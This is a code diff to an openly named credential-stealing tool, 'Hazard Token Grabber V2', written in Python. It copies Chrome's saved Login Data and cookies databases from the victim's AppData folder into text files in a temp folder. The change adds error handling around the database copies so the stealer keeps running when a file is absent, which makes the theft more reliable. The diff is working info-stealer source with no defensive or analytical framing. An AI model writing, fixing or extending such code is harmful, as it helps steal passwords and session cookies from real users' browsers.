@@ -100,7 +100,10 @@ class Hazard_Token_Grabber_V2:
         f = open (self.tempfolder+"\\Google Passwords.txt", "w+")
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
-        shutil.copy2(login_db, "Loginvault.db")
+        try:
+            shutil.copy2(login_db, "Loginvault.db")
+        except FileNotFoundError:
+            pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         try:
@@ -126,7 +129,10 @@ class Hazard_Token_Grabber_V2:
         f = open (self.tempfolder+"\\Google Cookies.txt", "w+")
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
-        shutil.copy2(login_db, "Loginvault.db")
+        try:
+            shutil.copy2(login_db, "Loginvault.db")
+        except FileNotFoundError:
+            pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         try:
